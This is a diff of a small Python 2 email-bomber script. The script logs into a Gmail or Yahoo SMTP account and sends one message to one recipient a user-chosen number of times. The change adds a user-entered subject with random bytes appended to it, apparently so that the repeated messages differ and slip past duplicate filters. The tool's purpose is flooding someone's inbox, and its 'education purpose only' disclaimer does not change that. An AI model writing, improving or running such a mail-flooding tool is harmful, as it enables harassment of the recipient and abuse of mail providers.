@@ -3,21 +3,17 @@
 #This code for education purpose only.
 #Use it at your own risk !!!
 
-
-
 import os
 import smtplib
 import getpass
 import sys
 
-
 server = raw_input ('MailServer Gmail/Yahoo: ')
 user = raw_input('Email: ')
 passwd = getpass.getpass('Password: ')
 
-
 to = raw_input('\nTo: ')
-#subject = raw_input('Subject: ') 
+subjectA = raw_input('Subject: ') 
 body = raw_input('Message: ')
 total = input('Number of send: ')
 
@@ -40,7 +36,8 @@ try:
             server.starttls()
     server.login(user,passwd)
     for i in range(1, total+1):
-        subject = os.urandom(9)
+        subjectB = os.urandom(5)
+	subject = subjectA + " " + subjectB
         msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
         server.sendmail(user,to,msg)
         print "\rE-mails sent: %i" % i
